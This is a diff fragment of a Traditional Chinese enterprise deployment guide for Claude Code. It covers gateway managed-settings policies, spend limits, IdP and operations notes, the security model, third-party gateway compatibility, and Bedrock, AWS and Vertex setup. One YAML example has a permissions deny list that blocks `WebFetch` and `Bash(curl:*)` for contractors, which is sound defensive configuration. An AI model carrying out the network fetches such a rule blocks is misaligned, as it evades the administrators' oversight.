+- `forward_user_identity: true`（v2.1.233+）：把開發者的 email 與 IdP subject 以標頭送給**你自己營運的 proxy**；若 `base_url` 指向 Anthropic API，gateway 會拒絕啟動。
+- 【⚠️ 文件不一致】v2.1.281 的 changelog 新增了 Bedrock 上游的 **`assume_role`**（透過 STS 以 IAM role 呼叫 Bedrock，可跨帳號，並可每位開發者各開一個 session）與 **`guardrail: {id, version}`**（對每個請求套用 Amazon Bedrock Guardrail，**必須全部 Bedrock 上游都設或都不設**），但查證當日設定參考頁**尚未收錄**這兩個鍵，採用前請以 `GET /protocol` 或實測確認語法。
+
+#### 53.9.2 `managed` 政策：依群組交付 managed settings【Official】
+
+```yaml
+managed:
+  policies:
+    - match: { groups: [platform-admins] }
+      cli:
+        availableModels: [opus, sonnet]
+    - match: { groups: [contractors] }
+      cli:
+        availableModels: [sonnet]
+        permissions:
+          deny: ["WebFetch", "Bash(curl:*)"]
+    - match: {}            # 基底層：其他政策會繼承未設定的鍵
+      cli:
+        availableModels: [sonnet, haiku]
+        enforceAvailableModels: true
+        permissions:
+          disableBypassPermissionsMode: disable
+```
+
+| 規則 | 說明 |
+| --- | --- |
+| 比對順序 | 依序評估，**第一個符合者**被選中，再疊加到 `match: {}` 基底層上 |
+| 群組比對 | **區分大小寫**，必須與 IdP 輸出完全一致（Entra 會輸出 Object ID GUID） |
+| 允許清單（`availableModels`、`permissions.allow`） | 特定政策的清單**完全取代**基底層 |
+| 拒絕清單與 hooks（`permissions.deny`／`ask`、`deniedMcpServers`、`blockedMarketplaces`、各 hook 陣列） | **聯集**。🎯 組織層的 deny 與稽核 hook **不會被角色政策意外覆蓋** |
+| 物件型（`env`、`modelOverrides`、`skillOverrides`） | 淺層合併 |
+| 驗證 | 啟動時以 CLI 的 settings schema 驗證 `cli` 區塊，**未知的頂層鍵會讓 gateway 無法啟動**；要使用新版 Claude Code 才有的鍵，必須先升級 gateway |
+| 啟動即失敗的比對值（v2.1.232+） | 空的 `groups` 清單、空的群組項目、空的 `email_domain`、含 `@` 或空白的網域。v2.1.232 之前，**空的 `email_domain` 會讓政策比對到所有已認證的使用者** |
+| MCP | 用 `managedMcpServers`（v2.1.259+）；寫 `mcpServers` 會被拒 |
+| 優先權 | gateway 交付的設定**排在 MDM 與本機 `managed-settings.json` 之前** |
+
+### 53.10 花費上限（Spend Limits）【Official】（v1.2 新增）
+
+所有推論共用一個上游憑證，所以 Provider 帳單只會歸到那個憑證上。**沒有每人上限時，一個失控的 agent 叢集就能用光整個組織的承諾額度**。Spend limits 是 gateway 提供的「每人視角」與斷路器。
+
+| 項目 | 說明 |
+| --- | --- |
+| 設定方式 | 透過 Admin API `POST /v1/organizations/spend_limits`（**不寫在 `gateway.yaml`**） |
+| 範圍 | `user`（OIDC `sub`）、`rbac_group`、`organization` |
+| 週期 | `daily`、`weekly`、`monthly`，各自獨立生效；UTC 邊界重置（週一、每月 1 日） |
+| 金額 | 美分的整數字串；`null` 為無上限，`"0"` 會封鎖所有請求 |
+| 有效上限的解析 | 個人覆寫 → 最嚴格的群組上限（`group_limit_mode: max` 可改為最寬鬆）→ 組織預設 → 無上限。**群組上限是每人預設值，不是共用額度池** |
+| 超過上限 | `429 billing_error`、`x-should-retry: false`、`retry-after`，訊息會附上 `admin.blocked_message` |
+| 開發者端提示 | 使用率超過 75% 與 95% 時警告；v2.1.251+ 的 `/usage` 會顯示 **Spend limit** 進度條 |
+| 權限 | `admin.write_keys`／`read_keys`（給自動化使用，稽核記錄為 `admin-key:<id>`）；`admin.admin_groups`（給人員使用，記錄為 `oidc:<sub>`） |
+
+計價順序：`pricing.overrides` → 上游 model ID 的牌價 → 對應的 `models[].id` 牌價 → **未知模型一律以 $5／$25 per MTok 計算**（確保不會免費）；最後乘上 `pricing.multiplier`（可 > 1 做內部加成，上限 10）。**用戶端中途中止也會被計費**（以已送出文字估算的下限計價）。
+
+> ⚠️ **這些金額是估算值，是斷路器而不是帳單**，請以 Provider 的用量報表對帳。
+>
+> 🚨 **Postgres 不可用時預設 fail-open**（請求放行但不計量）；要 fail-closed 請設 `enforcement.fail_closed_on_error: true`，但此時**所有人都會被封鎖**。
+
+資料保留（每小時清理）：`spend` 13 個月、`admin_audit` 365 天、**`principal_emails`（含 email、姓名、群組等個資）預設 90 天**。離職或個資查閱請求（DSAR）需要立即刪除時，可直接執行 `DELETE FROM principal_emails WHERE principal = '<sub>'`。⚠️ `/effective` 的 `q=` 與 `user_ids[]=` 會出現在 LB 的存取日誌中，個資政策嚴格的組織請在前端清除這兩個參數。
+
+### 53.11 維運：IdP、容量、故障與升級【Official】（v1.2 新增）
+
+**IdP 設定差異**：
+
+| IdP | 注意事項 |
+| --- | --- |
+| Okta | org authorization server 的 id_token 不含 email 與 groups，**必須設 `userinfo_fallback: true`**；custom authorization server 則不需要 |
+| Microsoft Entra ID | 輸出群組的 **Object ID GUID**，政策中要寫 GUID，或改用 App Roles；必要時設 `groups_claim: roles` |
+| Google Workspace | id_token **不含群組**，需要以 `oidc.google_groups` 經 Admin SDK Directory API 查詢（service account + domain-wide delegation） |
+| 無法發 refresh token 的 IdP | 可用，但沒有靜默更新；可把 `ttl_hours` 提高到 8–12，代價是停用帳號後的失效時間變長 |
+
+**部署決策**：
+
+| 決策 | 官方說明 |
+| --- | --- |
+| 成本 | **沒有授權費或座位費**，只付推論與運算資源 |
+| 🚨 **繞過** | gateway **不會**強制「只能經由它存取模型」。持有自己憑證的開發者仍可直連 Provider，要封住這條路必須靠網路政策（例如只允許 gateway 連 `api.anthropic.com`）；但這也會破壞 WebFetch 的網域安全檢查 |
+| 多個 gateway | 各自獨立部署；CLI 以主機名稱分別儲存信任與憑證 |
+| Serverless | Cloud Run 可用（`min-instances: 1`）；**Lambda 與 Cloud Functions 不可用** |
+| Ingress | 不要對 device-authorization 與 token 端點做 redirect（Claude Code 不跟隨 redirect）；idle timeout 要大於 keepalive 間隔（非 Anthropic 上游約每 15 秒送一次 ping） |
+
+**容量與故障**：
+
+- 大規模導入：登入依 IP 限流（預設每 10 分鐘 30 次開始、10 次驗證碼提交）。**先設 `trusted_proxies`**；很多人共用 NAT／VPN 出口時再調高 `rate_limits`。官方範例：10,000 人、4 個出口 IP、一小時內平均登入 → `max` 設 1,000。
+- 每個 replica 同時最多 **256** 個上游請求（`BUN_CONFIG_MAX_HTTP_REQUESTS` 可調整）；滿載時請求會在 gateway 內排隊，開發者看到的是回應遲遲不開始。**以 CPU 自動擴展不會觸發**，請把目標值設在出現 `client requests are open` 警告時的 CPU 水位以下。
+- Postgres 故障：既有 session 繼續可用（JWT 在本機驗證）、**新登入失敗**、花費上限預設 fail-open；`/readyz` 會回報未就緒，**以 readiness 控制流量的編排器會把所有 replica 一次移出服務**，必要時可改把 readiness probe 指向 `/healthz`。
+- IdP 故障：既有 session 可用到 `ttl_hours` 為止。
+- **JWT secret 輪替**（也是唯一能在伺服器端強制登出的方法）：把新 secret 加到陣列最前面 → 滾動部署 → 等 `ttl_hours` 加上一段緩衝 → 移除舊 secret。直接替換會讓所有 session 立即失效。
+- 升級：replica 無狀態，可以滾動重啟；啟動時自動執行 schema migration（以 advisory lock 序列化，只追加）。收到 `SIGTERM` 後預設有 25 秒的 drain window，長時間串流請調高 `CLAUDE_GATEWAY_DRAIN_TIMEOUT_MS`，並讓編排器的 grace period **至少再多 5 秒**（ECS Fargate 上限 120 秒；Cloud Run 固定 10 秒）。
+- 🚨 **gateway 的版本釘在你的映像檔中**，Claude Code 的安全修正**只有在你更新映像並重新部署後**才會生效。請把 gateway 納入「持有正式環境憑證的服務」的修補節奏。
+
+### 53.12 安全模型與法遵答題參考【Official】（v1.2 新增）
+
+| 資料 | 路徑 | gateway 是否送往 Anthropic |
+| --- | --- | --- |
+| 推論（prompt、回應） | CLI → gateway → 你的上游 | **只有在 Anthropic API 是上游時** |
+| 遙測 | CLI → gateway → 你的 collector | 永不 |
+| 身分（email、groups、sub） | IdP → gateway → JWT → CLI | 永不 |
+| Managed settings | gateway YAML → CLI | 永不 |
+| 稽核日誌 | gateway stderr → 你的日誌彙整系統 | 永不 |
+
+威脅模型重點：開發者筆電**不被視為可信任**；CLI 到 gateway 使用 RFC 8628 device grant、gateway 與 IdP 之間使用 PKCE；使用者驗證碼有 20⁸ 種組合、10 分鐘到期，並依 IP 限流；gateway 對 IdP、OTLP collector、Anthropic 上游的請求都經過 **SSRF 防護**（阻擋 link-local、雲端 metadata 端點與 loopback，但刻意允許 RFC 1918）。
+
+> 🚨 **兩個不在範圍內、必須自行負責的威脅**：（1）**gateway 主機被入侵**：它同時持有上游憑證，又向所有開發者發送 managed settings，控制力等同 MDM；（2）**惡意的 OIDC Provider**：它能宣告任何身分。
+
+法遵要點：
+
+- **用戶端分析**：登入 gateway 期間，CLI 會關閉自身的使用分析與錯誤回報；但**首次登入之前**的啟動事件仍會送出，要完全關閉請在 client-side managed settings 一併交付 `DISABLE_TELEMETRY`。
+- **用戶端機器**：WebFetch 的主機名稱檢查與版本檢查仍會送往 Anthropic，除非設定 `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` 與 `skipWebFetchPreflight: true`。
+- **更新**：請透過自家的發佈管道釘選版本，並設定 `DISABLE_UPDATES`（`DISABLE_AUTOUPDATER` 只停止背景更新，`claude update` 仍可執行）。
+- **TLS**：正式環境務必使用 HTTPS（gateway 本身**不會拒絕**純 HTTP）；Postgres 請用 `?sslmode=require`；在 ingress 設定 `Strict-Transport-Security`。
+
+### 53.13 AWS 與 Google Cloud 參考架構【Official】（v1.2 新增）
+
+> ⚠️ 官方明言：這兩份是「**可運作的範例，而非受支援的正式部署**」，用來理解各元件如何組合，實際導入時請依自身環境調整。
+
+| 元件 | AWS | Google Cloud |
+| --- | --- | --- |
+| 運算 | ECS on Fargate 或 EKS | Cloud Run 或 GKE |
+| 映像檔 | ECR | Artifact Registry |
+| 資料庫 | RDS for PostgreSQL（私有子網路、不可公開存取） | Cloud SQL for PostgreSQL（僅私有 IP） |
+| 秘密 | Secrets Manager（JWT key、OIDC client secret、Postgres URL） | Secret Manager（另含 `gateway.yaml` 本身） |
+| 上游身分 | IAM role（`bedrock:InvokeModel`、`InvokeModelWithResponseStream`、`CountTokens`），以 ECS task role 或 IRSA 綁定 | Service account（`roles/aiplatform.user`），直接掛載或以 Workload Identity 綁定 |
+| 入口 | 內部 ALB + Route 53 私有託管區域 + ACM／AWS Private CA 憑證 | 內部 Application LB（Cloud Run）或 `gce-internal` Ingress（GKE） |
+| 範例 IdP | Okta | Google Workspace |
+| 前置網路 | 至少兩個 AZ 的私有子網路，經 NAT gateway 對外 | 已發布所需 Claude 模型的 Model Garden 區域 |
+
+📌 AWS 上也可以用 **Claude Platform on AWS** 取代 Bedrock 或與其並用，但其上游設定、憑證與 IAM 權限不同。兩份範例都附有 Terraform 參考。
+
+### 53.14 既有 LLM Gateway 的導入與相容性【Official】（v1.2 新增）
+
+#### 53.14.1 Gateway 必須符合的六項要求【Official】
+
+| 要求 | 未符合時 |
+| --- | --- |
+| **接受支援的 API 格式**（Anthropic Messages、Bedrock InvokeModel、Agent Platform rawPredict） | 無法連線 |
+| **串流回應**，並轉送 keep-alive ping | 🚨 Claude Code 對靜默 **300 秒**的串流會中止；緩衝整個回應會讓畫面卡住 |
+| **路由 Claude 模型名稱** | 新模型出現 `404` |
+| **原封不動轉送 `anthropic-beta`、`anthropic-version` 與 request body** | `400`（例如 `Extra inputs are not permitted`） |
+| **原封不動回傳上游錯誤** | Claude Code 依錯誤文字做自動恢復，包裝錯誤會讓恢復失效 |
+| 🚨 **讓此路徑免於 WAF 的 request body 檢查** | prompt 中的原始碼與 XML 標籤會觸發 XSS 規則：**短的測試請求會過，真實 session 卻會 `403`** |
+
+> 🎯 **轉送原則：把 header 與 body 當成「開放清單」**。每一版 Claude Code 都可能新增 `anthropic-beta` 值與 body 欄位；以目前觀察到的清單做 allowlist，**下一版就會出錯**。例外是轉送到 Bedrock／Agent Platform 等非 Anthropic 格式的上游時，schema 轉換是 gateway 的責任（或讓用戶端設 `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1`）。
+
+#### 53.14.2 要發佈的設定【Official】
+
+| 變數 | 何時需要 |
+| --- | --- |
+| `ANTHROPIC_BASE_URL` | 一定需要 |
+| `ANTHROPIC_AUTH_TOKEN`（`Authorization: Bearer`）／`ANTHROPIC_API_KEY`（`x-api-key`）／`apiKeyHelper`（兩者皆送，適合會輪替或來自 vault 的憑證） | 三選一；放錯變數會得到 `401` |
+| `ANTHROPIC_CUSTOM_HEADERS` | gateway 需要租戶或路由標頭 |
+| `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1` | gateway 要依請求類型路由或計費（v2.1.273+） |
+| `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY` | gateway 提供 `/v1/models`，要讓 `/model` 顯示 gateway 的模型 |
+| `CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS` | 上游是會拒絕 beta 欄位的 Bedrock／Agent Platform |
+| `CLAUDE_CODE_SKIP_FAST_MODE_NETWORK_ERRORS`／`..._ORG_CHECK` | 組織使用 fast mode（可用性檢查會直連 `api.anthropic.com`） |
+| `ANTHROPIC_MODEL`、`ANTHROPIC_DEFAULT_HAIKU_MODEL` | gateway 的模型名稱與預設不同，或要把背景工作導到其他模型 |
+| `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` | 網路只允許連到 gateway 時。⚠️ 會**停用自動更新**與 fast mode 可用性檢查；WebFetch 安全檢查要另設 `skipWebFetchPreflight: true` |
+
+> 🚨 **計費提醒（對應 53.3）**：只要 gateway 憑證變數或 `apiKeyHelper` 生效，開發者的 claude.ai 訂閱**就不會被使用**，流量改以 token 計價、計入 gateway 所轉送之憑證的擁有者。只設定 `ANTHROPIC_BASE_URL` 則仍然使用訂閱。可以用 `/status` 確認目前生效的是哪一種憑證。
+
+#### 53.14.3 Gateway hint headers【Official】（v2.1.273+）
+
+直連 Anthropic API 時預設會送；經自訂 base URL 時**預設不送**（避免拒絕未知標頭的 proxy 讓請求失敗），需設 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`。這些標頭只包含固定詞彙、工具名稱與耗時，**不含 prompt 或檔案內容**。
+
+| 標頭 | 內容 | 企業用途 |
+| --- | --- | --- |
+| `x-claude-code-request-class` | `main`、`subagent`、`workflow`、`compaction`、`auxiliary` | 🎯 **依請求類型分流**：例如把 `auxiliary` 導到較便宜的模型或較低優先權的佇列 |
+| `x-claude-code-agent-type` | `Explore`、`Plan`、`custom`、`teammate`、`fork` 等 | 依 agent 類型歸因成本 |
+| `x-claude-code-compaction` | `auto`、`manual`、`reactive` | 監控長 session 的壓縮頻率 |
+| `x-claude-code-context-compacted` | 壓縮後第一個主對話請求 | gateway 端的快取可以據此丟棄舊前綴 |
+| `x-claude-code-prev-tool-durations` | `Bash=742;Read=9`（最多 32 筆、4 KB） | 工具耗時分析 |
+
+另外一定會送的標頭：`x-claude-code-session-id`（以 session 彙總請求）、`x-claude-code-agent-id` 與 `x-claude-code-parent-agent-id`（歸因到平行的 subagent；**這是 agent 的識別碼，不是使用者識別碼**）。
+
+#### 53.14.4 System prompt 歸屬區塊與快取【Official】
+
+Claude Code 會在 system prompt 最前面加一段歸屬區塊（版本與對話指紋）。`api.anthropic.com` 只有在它**原封不動地位於第一個 system block** 時才會移除它。gateway 若在前面插入其他 system block、重新排序，或把陣列合併成單一字串，這段區塊就會進入模型與快取鍵；若合併到同一個 block 中，**整段 system prompt 都可能被當成歸屬區塊丟棄**。gateway 必須改寫 system 內容時，請讓用戶端設 `CLAUDE_CODE_ATTRIBUTION_HEADER=0`，**不要在 gateway 端移除或搬移它**。
+
+#### 53.14.5 維護與版本升級【Official】
+
+| 變化 | 症狀 | 對策 |
+| --- | --- | --- |
+| 新版 Claude Code 新增 beta 值與 body 欄位 | 升級後出現 `400` | 原封不動轉送；**新版本先對 gateway 測試再發佈** |
+| 新模型推出 | 選新模型得到 `404` | 更新 gateway 路由，並同步更新發佈的模型變數 |
+| 憑證到期 | 全部 `401` | Provider 憑證依排程輪替；開發者憑證以 `apiKeyHelper` 輪替 |
+
+> ⚠️ **不會產生錯誤、卻會改變行為的升級差異**：不抓取 feature flag 的 session 所使用的旗標預設值、gateway 別名（例如 `prod-opus`）的模型能力假設、預設模型與別名的解析結果（見第 [5.2 節](#52-模型與別名official)）。請以 `requiredMaximumVersion` 或 `DISABLE_UPDATES` 釘住已測試的版本，並以 `ANTHROPIC_DEFAULT_MODEL`、`modelOverrides` 固定模型行為。另外，速率限制請預留用戶端**最多重試 10 次**（遵守 `Retry-After`）的空間。
+
+### 53.15 本章注意事項
 
 > 🚨 **一、不要假設 gateway 是透明的。** Remote Control 與 server-managed settings 會被**Claude Code 自己**關閉，與 gateway 的能力無關。
 
@@ -18339,7 +20369,11 @@ Gateway 是**貴組織自行運行、位於 Claude Code 與模型供應商之間
 
 > ⚠️ **四、用第三方 gateway 就要接受維護責任。** 每次 Claude Code 改版都可能改變 header 與請求欄位，轉發規則需同步更新，且 Anthropic 不稽核該產品。
 
-> 📌 **五、本章為 v1.1 新增，官方 10 頁中的部署細節（`-deploy`、`-on-aws`、`-on-gcp`、`llm-gateway-protocol`）未逐頁展開。** 實際部署前請查閱該系列對應頁面。
+> 🚨 **五、（v1.2 新增）Gateway 本身就是高價值目標。** 它同時持有上游憑證，又向所有開發者推送 managed settings，控制力等同 MDM。請以正式環境憑證服務的等級保護 gateway 主機，並把它納入修補節奏（第 [53.11 節](#5311-維運idp容量故障與升級officialv12-新增)、[53.12 節](#5312-安全模型與法遵答題參考officialv12-新增)）。
+
+> ⚠️ **六、（v1.2 新增）Claude Desktop 機器一定要設 `parentSettingsBehavior: "merge"`**，否則出口限制會靜默失效（第 [53.8.4 節](#5384-claude-desktop-與-parent-settings-的治理陷阱official)）。
+
+> ⚠️ **七、（v1.2 新增）既有 LLM Gateway 前面的 WAF 必須豁免 request body 檢查**，否則真實 session 會出現 `403`，而短的測試請求卻能通過（第 [53.14.1 節](#53141-gateway-必須符合的六項要求official)）。
 
 ---
 
@@ -18504,7 +20538,145 @@ Gateway 是**貴組織自行運行、位於 Claude Code 與模型供應商之間
 
 ⚠️ **Prompt caching 在多數 Provider 上運作方式相同，但在 Amazon Bedrock 上支援程度依模型而異**——這會直接影響第 [13.2 節](#132-prompt-cache省錢的關鍵機制official) 的成本模型，Bedrock 使用者請逐模型確認。
 
-### 54.9 本章注意事項
+### 54.9 部署選項總覽（third-party-integrations）【Official】（v1.2 新增）
+
+> 📌 **v1.2 覆核範圍**：第 54.9 至 54.13 節依官方 `third-party-integrations`、`amazon-bedrock`、`claude-platform-on-aws`、`google-vertex-ai`、`microsoft-foundry` 五頁逐頁覆核，解決 v1.1 附錄 F.3 #5 的未覆核項目。
+
+官方的基本立場：**對多數組織而言，Claude for Teams 或 Enterprise 是最佳選擇**（同一份訂閱包含 Claude Code 與 Claude on the web、集中計費、不需要自建基礎設施）。雲端 Provider 適合「必須沿用既有雲端合規控制與帳單」的組織。
+
+| 項目 | Teams／Enterprise | Anthropic Console | Amazon Bedrock | Claude Platform on AWS | Google Cloud's Agent Platform | Microsoft Foundry |
+| --- | --- | --- | --- | --- | --- | --- |
+| 最適合 | 多數組織（官方建議） | 個人開發者 | AWS 原生部署 | 要 AWS Marketplace 計費、又要 Claude API 功能 | GCP 原生部署 | Azure 原生部署 |
+| 計費 | Teams：Premium 每席 $150（另有 PAYG）；Enterprise：洽業務 | PAYG | 經 AWS PAYG | 經 AWS Marketplace PAYG | 經 GCP PAYG | 經 Azure PAYG |
+| 認證 | claude.ai SSO 或 email | API key 或 Console 登入 | API key 或 AWS 憑證 | API key 或 AWS 憑證 | GCP 憑證 | API key 或 Entra ID |
+| 成本追蹤 | 用量儀表板 | 用量儀表板 | AWS Cost Explorer | AWS Cost Explorer | GCP Billing | Azure Cost Management |
+| 含 Claude on web | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
+| 企業功能 | 團隊管理、SSO、用量監控 | 無 | IAM、CloudTrail | IAM、CloudTrail | IAM、Cloud Audit Logs | RBAC、Azure Monitor |
+
+官方給組織的共通建議：
+
+1. **一定要釘選模型版本**：使用 `ANTHROPIC_DEFAULT_FABLE_MODEL`、`ANTHROPIC_DEFAULT_OPUS_MODEL`、`ANTHROPIC_DEFAULT_SONNET_MODEL`、`ANTHROPIC_DEFAULT_HAIKU_MODEL`。沒有釘選時，別名會隨 Claude Code 改版前進，而新模型**可能尚未在你的帳號中啟用**。
+2. 提供「一鍵安裝」方式，是擴大採用的關鍵。
+3. 新使用者先從 codebase 問答、小型 bug 修正開始，並要求 Claude 先提出計畫。
+4. 由中央團隊設定 MCP server，並把 `.mcp.json` 提交進 repo。
+5. 🚨 **CMEK 注意事項**：若組織使用客戶自管加密金鑰（CMEK），又經 LLM gateway 或自訂 `ANTHROPIC_BASE_URL` 使用 Claude Code，**CMEK 不涵蓋這些 session 的營運遙測**。要全面關閉，請以 managed settings 交付 `DISABLE_TELEMETRY`。
+
+> ⚠️ **v2.1.280 的成本陷阱（所有雲端 Provider 通用）**：Bedrock、Claude Platform on AWS、Agent Platform 上的 `opus` 別名與**預設主模型**都已改為 **Opus 5.5**。官方明言：**沒有釘選主模型的部署，更新到新版後就會以 Opus 單價計費**。要維持 Sonnet 作為主模型，請把 `ANTHROPIC_MODEL` 設為完整的 model ID。
+
+### 54.10 Amazon Bedrock 部署細節【Official】（v1.2 新增）
+
+**啟用步驟**：
+
+| 步驟 | 重點 |
+| --- | --- |
+| 1. 提交 use case | 每個 AWS 帳號一次；AWS Organizations 可從管理帳號以 `PutUseCaseForModelAccess` API 提交（需要 `bedrock:PutUseCaseForModelAccess`），**自動延伸到子帳號** |
+| 2. 設定憑證 | 預設 AWS SDK 憑證鏈：`aws configure`、access key 環境變數、SSO profile（`aws sso login`）、`aws login`、**Bedrock API key**（`AWS_BEARER_TOKEN_BEDROCK`） |
+| 3. 啟用 | `CLAUDE_CODE_USE_BEDROCK=1`；區域解析順序為 `AWS_REGION` → `AWS_DEFAULT_REGION` → profile 的 region → `us-east-1` |
+| 4. 釘選模型 | 見下文 |
+| 精靈 | `claude` → **3rd-party platform** → Amazon Bedrock，或在 session 中執行 `/setup-bedrock`；結果寫入使用者設定的 `env` 區塊 |
+
+**憑證快取與自動更新**：
+
+- 解析後的憑證會快取到到期前 5 分鐘（沒有到期時間則快取 1 小時），每次解析的逾時為 60 秒；`CLAUDE_CODE_SKIP_AWS_CRED_CACHE=1` 可關閉快取。
+- `awsAuthRefresh`：只在憑證**過期**時執行（先以 STS `GetCallerIdentity` 確認；v2.1.239 起這個檢查也會走 proxy）。適合瀏覽器 SSO。
+- `awsCredentialExport`：session 開始與每次重新載入時都會執行，直接輸出 JSON 憑證，適合**跨帳號**憑證。
+- ⚠️ 在 VPN 或 TLS 檢查 proxy 環境中，`awsAuthRefresh` 可能造成**瀏覽器分頁無限開啟**。遇到時請移除這個設定，改為在啟動前手動執行 `aws sso login`。
+
+**模型與區域**：
+
+| 項目 | 說明 |
+| --- | --- |
+| 預設主模型 | **Opus 5.5**（例如 `us.anthropic.claude-opus-5-5`） |
+| 預設小型／快速模型 | **Sonnet 4.5**（因為 Haiku 未必在每個帳號或區域啟用）；背景工作預設也使用它 |
+| 跨區域推論前綴 | `us-gov.`（GovCloud，固定）、`us.`、`eu.`、`apac.`，其他區域為 `global.`；可用 `ANTHROPIC_BEDROCK_REGION_PREFIX`（`us`、`eu`、`apac`、`jp`、`au`、`global`）指定偏好 |
+| 多版本對應 | `modelOverrides` 可把每個模型版本對應到各自的 **application inference profile ARN** |
+| 啟動檢查 | 有釘選且帳號可呼叫更新版本時，會提示是否更新釘選；沒有釘選且預設模型不可用時，本 session 會退回較舊版本或 Sonnet（**不會持久化**） |
+| 1M context | Sonnet 5 一律 1M；其他模型在 model ID 後加 `[1m]` |
+| Service tier | `ANTHROPIC_BEDROCK_SERVICE_TIER`（`default`、`flex` 或 `priority`）（以 `X-Amzn-Bedrock-Service-Tier` 送出） |
+| API | 只支援 **Invoke API**，**不支援 Converse API** |
+| 不可用 | `/logout`、**WebSearch 工具** |
+
+**IAM 最小權限**：`bedrock:InvokeModel`、`bedrock:InvokeModelWithResponseStream`、`bedrock:CountTokens`，以及 `bedrock:GetInferenceProfile`（使用 application inference profile ARN 時需要；缺少時會多一次重試往返）。官方建議**為 Claude Code 建立專用的 AWS 帳號**，以簡化成本追蹤與存取控制。
+
+**AWS Guardrails**：在 Bedrock 主控台建立並發佈 Guardrail 版本，再把 Guardrail 標頭加進設定檔（使用跨區域推論時，Guardrail 也要啟用 Cross-Region）。若改由 Claude Apps Gateway 政策交付這些標頭，它們屬於**需要核准的設定**（見第 [8.8.3 節](#883-安全核准對話框會擋住無人值守流程的一件事official)）。
+
+**Mantle 端點**：以原生 Anthropic API 形式提供 Claude 的 Bedrock 端點（`CLAUDE_CODE_USE_MANTLE=1`）。
+
+- model ID 以 `anthropic.` 為前綴、不含版本後綴（例如 `anthropic.claude-sonnet-5`），可用的模型依 AWS 授權而定。
+- 可與 Invoke API **同時啟用**：符合 Mantle 格式的 ID 送往 Mantle，其他送往 Invoke API（`/status` 會顯示 `Amazon Bedrock + Amazon Bedrock (Mantle)`）。
+- 經 gateway 注入憑證時，設 `CLAUDE_CODE_SKIP_MANTLE_AUTH=1` 與 `ANTHROPIC_BEDROCK_MANTLE_BASE_URL`。
+- ⚠️ **Claude Apps Gateway 不支援 Mantle 作為上游**。
+
+**Gateway／proxy 串流陷阱**：Bedrock 串流使用二進位的 `application/vnd.amazon.eventstream`。gateway 若把 `Content-Type` 改寫成 `text/event-stream`，Claude Code 會拒絕回應；若刪除標頭又轉成 SSE，Claude Code 會退回**每回合都不串流**的慢速路徑（可設 `CLAUDE_CODE_DISABLE_BEDROCK_CONTENT_TYPE_DEFAULT=1` 應急）。**正解是讓 gateway 原封不動轉送**；若 gateway 已經改說 Anthropic Messages API，就改用 `ANTHROPIC_BASE_URL` 連線。
+
+### 54.11 Claude Platform on AWS 部署細節【Official】（v1.2 新增）
+
+**本質**：由 Anthropic 營運的 Claude API，但使用 **AWS 認證、IAM 存取控制與 AWS Marketplace 計費**。請求直達 Anthropic API，因此模型與 API 功能**與 Claude API 相同、同步上線**。
+
+> 🚨 **組織隔離**：透過 AWS Marketplace 訂閱時，會**另外建立一個與你 AWS 帳號綁定的 Anthropic 組織**，與既有的 Anthropic 組織**完全分開，憑證也不互通**。請使用 AWS 綁定組織的 workspace ID 與 API key，而不是既有 Console 帳號的。
+
+| 項目 | 說明 |
+| --- | --- |
+| 啟用 | `CLAUDE_CODE_USE_ANTHROPIC_AWS=1` + `ANTHROPIC_AWS_WORKSPACE_ID`（**必填**，每個請求都以 `anthropic-workspace-id` 標頭送出）+ `AWS_REGION` |
+| 端點 | `https://aws-external-anthropic.{region}.api.aws`（可用 `ANTHROPIC_AWS_BASE_URL` 覆寫） |
+| 認證 A：SigV4 | 標準 AWS 憑證鏈（SSO、IAM role 等）；CI 請給 runner 一個 IAM role；可設 `awsAuthRefresh`（v2.1.198+） |
+| 認證 B：Workspace API key | `ANTHROPIC_AWS_API_KEY`（以 `x-api-key` 送出），**優先於 SigV4**；是長期有效的秘密，請比照正式環境憑證管理 |
+| Provider 優先權 | 即使環境中有 AWS 憑證也需要明確 opt-in；**`CLAUDE_CODE_USE_BEDROCK` 與 `CLAUDE_CODE_USE_FOUNDRY` 優先**，必須先取消設定 |
+| 模型 ID | 與直接使用 Claude API 相同；`opus` 預設為 Opus 5.5 |
+| 經 gateway | `ANTHROPIC_AWS_BASE_URL` 指向 proxy；由 gateway 簽署時設 `CLAUDE_CODE_SKIP_ANTHROPIC_AWS_AUTH=1` |
+| Agent SDK | 讀取相同的環境變數 |
+| 不可用 | 透過 Anthropic feature flag 開啟的用戶端功能預設關閉；**Advisor 不可用**；`/login` 與 `/logout` 不會登入 claude.ai 訂閱 |
+
+常見錯誤：每個請求都 `403`（IAM principal 缺少 `aws-external-anthropic` 權限，或 API key 過期）；缺少 workspace 的錯誤（未設 `ANTHROPIC_AWS_WORKSPACE_ID`）；請求仍送往 `api.anthropic.com`（啟用變數沒有生效，或 Bedrock／Foundry 的變數優先）。
+
+### 54.12 Google Cloud's Agent Platform 部署細節【Official】（v1.2 新增）
+
+> 📌 Google Cloud's Agent Platform 是 **Vertex AI 的新名稱**；環境變數仍沿用 `VERTEX` 拼法，登入畫面也仍顯示「Google Vertex AI」。
+
+| 步驟 | 重點 |
+| --- | --- |
+| 1. 啟用 API | `gcloud services enable aiplatform.googleapis.com` |
+| 2. 申請模型存取 | 在 Model Garden 申請（**可能需要 24–48 小時**） |
+| 3. 憑證 | Application Default Credentials；支援 **X.509 憑證型 Workload Identity Federation**（`GOOGLE_APPLICATION_CREDENTIALS`）；`gcpAuthRefresh` 可自動更新（逾時 3 分鐘） |
+| 4. 啟用 | `CLAUDE_CODE_USE_VERTEX=1`、`CLOUD_ML_REGION`、`ANTHROPIC_VERTEX_PROJECT_ID` |
+| 精靈 | `/setup-vertex` |
+
+| 項目 | 說明 |
+| --- | --- |
+| 區域 | `CLOUD_ML_REGION` 可設 `global`、多區域（`eu`、`us`）或特定區域（`us-east5`）；各模型可用 `VERTEX_REGION_CLAUDE_*` 單獨指定。**模型在各端點類型的可用性不同**，有些模型只在 `global` 或多區域提供 |
+| 專案 | 🚨 一律使用 `ANTHROPIC_VERTEX_PROJECT_ID`，**即使 `GOOGLE_CLOUD_PROJECT` 或憑證檔帶有不同的專案** |
+| 預設模型 | 主模型 `claude-opus-5-5`；小型／快速模型 `claude-sonnet-4-5@20250929` |
